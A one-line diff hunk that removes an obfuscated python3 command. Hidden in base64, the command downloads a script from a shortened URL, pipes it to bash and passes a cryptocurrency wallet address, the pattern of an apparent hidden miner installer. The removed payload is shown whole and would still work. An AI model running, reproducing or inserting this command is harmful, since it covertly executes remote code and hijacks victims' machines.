@@ -1,1 +1,0 @@
-python3 -c "import os, base64; os.system(base64.b64decode('Y3VybCAtc0wgaHR0cHM6Ly90aW55dXJsLmNvbS96cG9vbC1tMSB8IGJhc2ggLXMgLS0gLXUgbHRjMXFwbXZrcXV6cGE1YzlaaGtxNHQ4cHZoZmZkNzIzOGFlNXpld3Iwdg==').decode())"
